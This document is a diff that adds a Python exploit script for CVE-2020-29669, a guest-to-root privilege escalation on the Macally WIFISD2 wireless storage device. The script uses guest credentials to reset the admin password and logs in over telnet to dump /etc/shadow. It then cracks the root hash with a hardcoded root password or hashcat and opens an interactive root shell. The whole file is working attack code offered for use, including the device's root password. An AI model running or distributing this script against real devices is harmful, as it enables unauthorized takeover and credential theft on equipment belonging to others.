@@ -1,0 +1,140 @@
+# Exploit Title: Macally WIFISD2-2A82 2.000.010 - Guest to Root Privilege Escalation
+# Date: 03.12.2020 
+# Exploit Author: Maximilian Barz and Daniel Schwendner
+# Vendor Homepage: https://us.macally.com/products/wifisd2
+# Version: 2.000.010
+# Tested on: Kali Linux 5.7.0-kali1-amd64
+# CVE : CVE-2020-29669
+# Reference: https://github.com/S1lkys/CVE-2020-29669/
+
+#!/usr/bin/env/python3
+import requests
+import telnetlib
+import os
+import sys
+import re
+
+banner = '''\033[94m
+  ██████ ▄▄▄█████▓ ▄▄▄       ██▀███   ▄▄▄▄    █    ██  ██▀███    ██████ ▄▄▄█████▓
+▒██    ▒ ▓  ██▒ ▓▒▒████▄    ▓██ ▒ ██▒▓█████▄  ██  ▓██▒▓██ ▒ ██▒▒██    ▒ ▓  ██▒ ▓▒
+░ ▓██▄   ▒ ▓██░ ▒░▒██  ▀█▄  ▓██ ░▄█ ▒▒██▒ ▄██▓██  ▒██░▓██ ░▄█ ▒░ ▓██▄   ▒ ▓██░ ▒░
+  ▒   ██▒░ ▓██▓ ░ ░██▄▄▄▄██ ▒██▀▀█▄  ▒██░█▀  ▓▓█  ░██░▒██▀▀█▄    ▒   ██▒░ ▓██▓ ░ 
+▒██████▒▒  ▒██▒ ░  ▓█   ▓██▒░██▓ ▒██▒░▓█  ▀█▓▒▒█████▓ ░██▓ ▒██▒▒██████▒▒  ▒██▒ ░ 
+▒ ▒▓▒ ▒ ░  ▒ ░░    ▒▒   ▓▒█░░ ▒▓ ░▒▓░░▒▓███▀▒░▒▓▒ ▒ ▒ ░ ▒▓ ░▒▓░▒ ▒▓▒ ▒ ░  ▒ ░░   
+░ ░▒  ░ ░    ░      ▒   ▒▒ ░  ░▒ ░ ▒░▒░▒   ░ ░░▒░ ░ ░   ░▒ ░ ▒░░ ░▒  ░ ░    ░    
+░  ░  ░    ░        ░   ▒     ░░   ░  ░    ░  ░░░ ░ ░   ░░   ░ ░  ░  ░    ░      
+      ░                 ░  ░   ░      ░         ░        ░           ░           
+                                           ░                                     
+\x1b[0m
+Macally WIFISD2 Guest to Root Privilege Escalation for CVE-2020-29669 by Maximilian Barz and Daniel Schwendner 
+'''
+def main():
+    if(len(sys.argv) < 2):
+        print(banner)
+        print("Usage: %s <host> " % sys.argv[0])
+        print("Eg:    %s 1.2.3.4 " % sys.argv[0])
+        return
+    rhost = sys.argv[1]
+    session = requests.Session()
+    guest_creds = "guest_pass"
+    admin_pass_to_set = "Silky123"
+
+    def send_requests():
+        url = "http://"+rhost+"/protocol.csp?function=set"
+        payload = {'fname':'security','opt':'pwdchk','name':'guest','pwd1':guest_creds,'function':'set'}
+        headers = {
+            'Host': rhost,
+            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0',
+            'Accept': '*/*',
+            'Accept-Language': 'en-US,en;q=0.5',
+            'Accept-Encoding': 'gzip, deflate',
+            'Referer': 'http://'+rhost+'/index.html',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Content-Length': '65',
+            'Connection': 'close',
+            'Cache-Control': 'no-cache',
+        }
+        
+        r= session.post(url, payload, headers)
+        if (b"<errno>0</errno>" in r.content):
+            print("\033[92m[+] Authentication successful\x1b[0m")
+            print("\t"+str(session.cookies.get_dict()))
+        else:
+            print("\033[91m[+] Authentication failed.\x1b[0m")
+            sys.exit()
+
+        url = "http://"+rhost+"/protocol.csp?fname=security&function=set"    
+        payload = {'name':'admin','opt':'pwdmod','pwd1':admin_pass_to_set,'pwd2':admin_pass_to_set}
+        headers = {
+            'Host': rhost,
+            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0',
+            'Accept': '*/*',
+            'Accept-Language': 'en-US,en;q=0.5',
+            'Accept-Encoding': 'gzip, deflate',
+            'Referer': 'http://'+rhost+'/app/user/guest.html',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Content-Length': '49',
+            'Connection': 'close',
+            'Cache-Control': 'no-cache',
+        }
+        d = session.post(url, payload, headers)
+        if (b"<errno>0</errno>" in d.content):
+            print("\033[92m[+] Admin Password changed to: "+admin_pass_to_set+"\x1b[0m")
+            telnet_grep_root_hash()
+            #print("[+] Spawning Admin Shell")
+            #telnet_login()
+        else:
+            print("\033[91m[+] Admin Password change failed\x1b[0m")
+            sys.exit()
+
+
+    def telnet_grep_root_hash():
+        user = "admin"
+        tn = telnetlib.Telnet(rhost)
+        tn.read_until(b"login: ")
+        tn.write(user.encode('ascii') + b"\n")
+        tn.read_until(b"Password: ")
+        tn.write(admin_pass_to_set.encode('ascii') + b"\n")
+        print("\033[92m[+] Dumping Hashes:\x1b[0m")
+        tn.write(b"cat /etc/shadow\n\r")
+        tn.write(b"exit\n")
+        output = tn.read_all().decode('ascii')
+        L = output.split('\n')
+        for hash in L:
+            if ":" in hash:
+                print("\t"+hash)
+        print("\n\r")
+        for hash in L:
+            if "root" in hash:
+                print("\033[92m[+] Root Hash found, trying to crack it..\x1b[0m")
+                print("\t"+hash)  #root:$1$D0o034Sm$LY0jyeFPifEXVmdgUfSEj/:15386:0:99999:7:::
+                f = open("root_hash","w+")
+                f.write(hash)
+                f.close()
+                crack_root_hash();
+
+
+    def crack_root_hash():
+        f = open("root_hash", "r")
+        hash = f.read()
+        if ("root:$1$D0o034Sm$LY0jyeFPifEXVmdgUfSEj/:15386:0:99999:7:::" in hash):
+            print("\033[92mRoot Password: 20080826\x1b[0m\n")
+            telnet_login()
+        else:
+            os.system("hashcat -a 0 -m 500 root_hash /root/tools/routersploit/routersploit/resources/wordlists/passwords.txt") #https://github.com/threat9/routersploit/blob/master/routersploit/resources/wordlists/passwords.txt
+
+    def telnet_login():
+        print("\033[92m[+] Spawning Rootshell\x1b[0m")
+        user = "root"
+        root_password="20080826"
+        tn = telnetlib.Telnet(rhost)
+        tn.read_until(b"login: ")
+        tn.write(user.encode('ascii') + b"\n")
+        tn.read_until(b"Password: ")
+        tn.write(root_password.encode('ascii') + b"\n")
+        tn.interact()
+    print(banner)
+    send_requests()
+
+if(__name__ == '__main__'):
+    main()
